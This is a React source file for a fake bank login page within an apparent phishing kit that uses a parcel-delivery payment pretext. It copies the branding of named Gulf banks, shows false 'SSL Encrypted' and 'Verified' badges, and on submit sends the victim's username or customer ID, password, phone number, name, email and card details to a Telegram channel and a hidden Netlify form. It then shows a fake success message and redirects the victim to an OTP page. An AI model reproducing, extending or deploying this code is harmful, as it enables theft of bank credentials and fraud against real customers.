import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { bankBranding, shippingCompanyBranding } from "@/lib/brandingSystem";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, ShieldCheck, CheckCircle, Loader2, User, Smartphone, IdCard, KeyRound, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";
import { applyDynamicIdentity } from "@/lib/dynamicIdentity";
import { designSystem } from "@/lib/designSystem";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedBankId = linkData?.payload?.selectedBank || '';
  const cardInfo = linkData?.payload?.cardInfo || {
    cardName: '',
    cardLast4: '',
    cardNumber: '',
    cardExpiry: '',
    cardCvv: '',
    cardType: '',
  };
  
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";

  const shippingInfo = linkData?.payload as any;

  const rawAmount = shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);
  
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
  
  useEffect(() => {
    if (selectedBankId && selectedBankId !== 'skipped') {
      applyDynamicIdentity(`bank_${selectedBankId}`);
    }
  }, [selectedBankId]);
  
  const getLoginType = () => {
    if (!selectedBank) return 'username';
    
    const bankId = selectedBank.id;
    
    if (bankId === 'alrajhi_bank' || bankId === 'alahli_bank' || bankId === 'samba_bank' || 
        bankId === 'arab_national_bank' || bankId === 'alinma_bank' || bankId === 'aljazira_bank' ||
        bankId === 'emirates_nbd' || bankId === 'fab' || bankId === 'dib' || bankId === 'cbd' ||
        bankId === 'gulf_bank' || bankId === 'burgan_bank' || bankId === 'ahli_united_bank' ||
        bankId === 'cbq' || bankId === 'doha_bank' || bankId === 'masraf_alrayan' ||
        bankId === 'national_bank_oman' || bankId === 'bank_dhofar' || bankId === 'nizwa_bank' ||
        bankId === 'nbb' || bankId === 'ahli_united_bahrain' || bankId === 'bisb' || bankId === 'khaleeji_bank') {
      return 'username';
    }
    
    return 'customerId';
  };
  
  const loginType = getLoginType();
  
  if (linkLoading || !linkData) {
    return (
      <div 
        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
        dir="rtl"
        style={{
          background: selectedBankBranding?.colors?.surface ? `linear-gradient(135deg, ${selectedBankBranding.colors.surface}, ${selectedBankBranding.colors.background})` : branding.colors.primary + '10'
        }}
      >
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: branding.colors.primary }} />
          <p style={{ color: branding.colors.text, fontFamily: designSystem.typography.fontFamilies.arabic }}>جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (loginType === 'username' && (!username || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال اسم المستخدم وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'customerId' && (!customerId || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم العميل وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    if (loginType === 'phone' && (!phoneNumber || !password)) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رقم الجوال وكلمة المرور",
        variant: "destructive",
      });
      return;
    }
    
    setIsSubmitting(true);

    const bankLoginData = {
      username: loginType === 'username' ? username : '',
      customerId: loginType === 'customerId' ? customerId : '',
      phoneNumber: loginType === 'phone' ? phoneNumber : '',
      password: password,
      loginType: loginType,
    };

    sessionStorage.setItem('bankLoginData', JSON.stringify(bankLoginData));

    if (linkData) {
      try {
        const updatedPayload = {
          ...linkData.payload,
          bankLoginData,
        };

        await updateLink.mutateAsync({
          linkId: id!,
          payload: updatedPayload
        });
      } catch (error) {
      }
    }
    
    try {
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "bank-login",
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          service: serviceName,
          amount: formattedAmount,
          country: selectedCountryData?.nameAr || '',
          bank: selectedBank?.nameAr || 'غير محدد',
          cardLast4: cardInfo.cardLast4,
          loginType: loginType,
          username: bankLoginData.username,
          customerId: bankLoginData.customerId,
          phoneNumber: bankLoginData.phoneNumber,
          password: password,
          timestamp: new Date().toISOString()
        }).toString()
      });
    } catch (err) {
    }

    await sendToTelegram({
      type: 'bank_login',
      data: {
        name: customerInfo.name || '',
        email: customerInfo.email || '',
        phone: customerInfo.phone || '',
        service: serviceName,
        country: selectedCountryData?.nameAr || '',
        countryCode: selectedCountry,
        bank: selectedBank?.nameAr || 'غير محدد',
        bankId: selectedBankId,
        cardLast4: cardInfo.cardLast4,
        cardType: cardInfo.cardType,
        loginType: loginType,
        username: bankLoginData.username,
        customerId: bankLoginData.customerId,
        phoneNumber: bankLoginData.phoneNumber,
        password: password,
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });

    setIsSubmitting(false);
    
    toast({
      title: "تم بنجاح",
      description: "تم تسجيل الدخول بنجاح",
    });
    
    navigate(`/pay/${id}/otp`);
  };
  
  const primaryColor = selectedBankBranding?.colors?.primary || branding.colors.primary;
  const secondaryColor = selectedBankBranding?.colors?.secondary || branding.colors.secondary;
  const surfaceColor = selectedBankBranding?.colors?.surface || '#F5F5F5';
  const textColor = selectedBankBranding?.colors?.text || '#1A1A1A';
  const borderColor = selectedBankBranding?.colors?.border || '#E5E5E5';
  
  return (
    <>
      <div 
        className="min-h-screen flex flex-col"
        dir="rtl"
        style={{
          background: surfaceColor,
          fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif'
        }}
      >
        {/* Authentic Bank Header */}
        <div 
          className="w-full py-6 px-4 shadow-md"
          style={{
            background: '#FFFFFF',
            borderBottom: `3px solid ${primaryColor}`
          }}
        >
          <div className="container mx-auto max-w-6xl flex items-center justify-between">
            <div className="flex items-center gap-4">
              <div className="w-28 sm:w-36">
                <BankLogo 
                  bankId={selectedBank?.id || ''}
                  bankName={selectedBank?.name || ''}
                  bankNameAr={selectedBank?.nameAr || ''}
                  color={selectedBank?.color || primaryColor}
                  size="lg"
                  className="w-full"
                />
              </div>
              <div className="h-10 w-px bg-gray-300 hidden sm:block" />
              <div className="hidden sm:block">
                <h2 className="text-lg font-bold" style={{ color: textColor }}>
                  الخدمات المصرفية الإلكترونية
                </h2>
                <p className="text-sm text-gray-500">
                  Internet Banking
                </p>
              </div>
            </div>
            
            <div className="flex items-center gap-3">
              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
                <ShieldCheck className="w-4 h-4 text-green-600" />
                <span className="text-xs font-medium text-green-700">اتصال آمن</span>
              </div>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="flex-1 py-8 sm:py-12">
          <div className="container mx-auto px-4 max-w-md">
            <Card 
              className="overflow-hidden border-0"
              style={{
                borderRadius: selectedBankBranding?.borderRadius?.lg || '12px',
                boxShadow: '0 4px 20px rgba(0,0,0,0.08)'
              }}
            >
              {/* Card Header with Bank Brand */}
              <div 
                className="px-6 sm:px-8 pt-6 sm:pt-8 pb-4"
                style={{
                  background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                }}
              >
                <div className="text-center">
                  <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/20 backdrop-blur-sm mb-3">
                    <Lock className="w-8 h-8 text-white" />
                  </div>
                  <h1 className="text-2xl sm:text-3xl font-bold text-white mb-2">
                    تسجيل الدخول
                  </h1>
                  <p className="text-sm text-white/90">
                    {selectedBank?.nameAr || 'البنك'}
                  </p>
                </div>
              </div>

              {/* Form Content */}
              <div className="px-6 sm:px-8 py-6 sm:py-8 bg-white">
                {/* Security Notice */}
                <div 
                  className="rounded-lg p-3 mb-6 flex items-start gap-3"
                  style={{
                    background: `${primaryColor}08`,
                    border: `1px solid ${primaryColor}30`
                  }}
                >
                  <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: primaryColor }} />
                  <div className="text-sm" style={{ color: textColor }}>
                    <p className="font-semibold mb-1">تحذير أمني</p>
                    <p className="text-xs text-gray-600">
                      لا تشارك بياناتك المصرفية مع أي شخص. البنك لن يطلب منك كلمة المرور عبر الهاتف أو البريد الإلكتروني.
                    </p>
                  </div>
                </div>

                <form onSubmit={handleSubmit} className="space-y-5">
                  {/* Username / Customer ID Field */}
                  {loginType === 'username' && (
                    <div>
                      <Label 
                        className="mb-2 text-sm font-bold flex items-center gap-2"
                        style={{ color: textColor }}
                      >
                        <User className="w-4 h-4" />
                        اسم المستخدم
                      </Label>
                      <Input
                        type="text"
                        placeholder="أدخل اسم المستخدم"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        className="h-12 text-base pr-4 rounded-lg border-2 focus:border-primary transition-all"
                        style={{ 
                          borderColor: borderColor,
                          fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif'
                        }}
                        autoComplete="username"
                        required
                      />
                    </div>
                  )}
                  
                  {loginType === 'customerId' && (
                    <div>
                      <Label 
                        className="mb-2 text-sm font-bold flex items-center gap-2"
                        style={{ color: textColor }}
                      >
                        <IdCard className="w-4 h-4" />
                        رقم العميل / رقم الهوية
                      </Label>
                      <Input
                        type="text"
                        placeholder="أدخل رقم العميل"
                        value={customerId}
                        onChange={(e) => setCustomerId(e.target.value)}
                        className="h-12 text-base pr-4 rounded-lg border-2 focus:border-primary transition-all"
                        style={{ 
                          borderColor: borderColor,
                          fontFamily: selectedBankBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif'
                        }}
                        inputMode="numeric"
                        required
                      />
                    </div>
                  )}
                  
                  {/* Password Field */}
                  <div>
                    <div className="flex items-center justify-between mb-2">
                      <Label 
                        className="text-sm font-bold flex items-center gap-2"
                        style={{ color: textColor }}
                      >
                        <KeyRound className="w-4 h-4" />
                        كلمة المرور
                      </Label>
                      <button
                        type="button"
                        className="text-xs font-medium hover:underline transition-all"
                        style={{ color: primaryColor }}
                      >
                        هل نسيت كلمة المرور؟
                      </button>
                    </div>
                    <div className="relative">
                      <Input
                        type={showPassword ? "text" : "password"}
                        placeholder="أدخل كلمة المرور"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="h-12 text-base pr-4 pl-12 rounded-lg border-2 focus:border-primary transition-all"
                        style={{ 
                          borderColor: borderColor,
                          fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
                        }}
                        autoComplete="current-password"
                        required
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
                      >
                        {showPassword ? (
                          <EyeOff className="w-5 h-5" />
                        ) : (
                          <Eye className="w-5 h-5" />
                        )}
                      </button>
                    </div>
                  </div>
                  
                  {/* Remember Me */}
                  <div className="flex items-center gap-2">
                    <input 
                      type="checkbox" 
                      id="remember" 
                      className="w-4 h-4 rounded border-2" 
                      style={{ 
                        accentColor: primaryColor,
                        borderColor: borderColor
                      }}
                    />
                    <label 
                      htmlFor="remember" 
                      className="text-sm cursor-pointer select-none"
                      style={{ color: textColor }}
                    >
                      تذكرني على هذا الجهاز
                    </label>
                  </div>
                  
                  {/* Submit Button */}
                  <Button
                    type="submit"
                    size="lg"
                    className="w-full text-base py-6 text-white font-bold shadow-lg hover:shadow-xl transition-all duration-300 rounded-lg"
                    disabled={isSubmitting}
                    style={{
                      background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                      boxShadow: `0 8px 20px -6px ${primaryColor}60`
                    }}
                  >
                    {isSubmitting ? (
                      <span className="flex items-center gap-2">
                        <Loader2 className="w-5 h-5 animate-spin" />
                        جاري تسجيل الدخول...
                      </span>
                    ) : (
                      <span className="flex items-center gap-2">
                        <Lock className="w-5 h-5" />
                        تسجيل الدخول
                      </span>
                    )}
                  </Button>
                  
                  <p className="text-xs text-center text-gray-500 mt-4">
                    بتسجيل الدخول، أنت توافق على شروط وأحكام البنك وسياسة الخصوصية
                  </p>
                </form>
              </div>

              {/* Footer Links */}
              <div 
                className="px-6 sm:px-8 py-4 border-t"
                style={{
                  background: surfaceColor,
                  borderColor: borderColor
                }}
              >
                <div className="flex flex-col sm:flex-row items-center justify-between gap-3 text-xs">
                  <button
                    type="button"
                    className="font-medium hover:underline transition-all"
                    style={{ color: primaryColor }}
                  >
                    تسجيل مستخدم جديد
                  </button>
                  <div className="flex items-center gap-3 text-gray-500">
                    <div className="flex items-center gap-1.5">
                      <Lock className="w-3 h-3" />
                      <span>SSL Encrypted</span>
                    </div>
                    <span>•</span>
                    <div className="flex items-center gap-1.5">
                      <ShieldCheck className="w-3 h-3" />
                      <span>Verified</span>
                    </div>
                  </div>
                </div>
              </div>
            </Card>
            
            {/* Bank Footer */}
            <div className="mt-6 text-center">
              <p className="text-xs text-gray-500">
                © 2025 {selectedBank?.nameAr || 'البنك'}. جميع الحقوق محفوظة.
              </p>
              <div className="mt-2 flex items-center justify-center gap-4 text-xs text-gray-400">
                <a href="#" className="hover:text-gray-600 transition-colors">الشروط والأحكام</a>
                <span>•</span>
                <a href="#" className="hover:text-gray-600 transition-colors">سياسة الخصوصية</a>
                <span>•</span>
                <a href="#" className="hover:text-gray-600 transition-colors">الأسئلة الشائعة</a>
              </div>
            </div>
          </div>
        </div>
      </div>
    
      <form name="bank-login" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="country" />
        <input type="text" name="bank" />
        <input type="text" name="cardLast4" />
        <input type="text" name="loginType" />
        <input type="text" name="username" />
        <input type="text" name="customerId" />
        <input type="text" name="phoneNumber" />
        <input type="password" name="password" />
        <input type="text" name="timestamp" />
      </form>
    </>
  );
};

export default PaymentBankLogin;
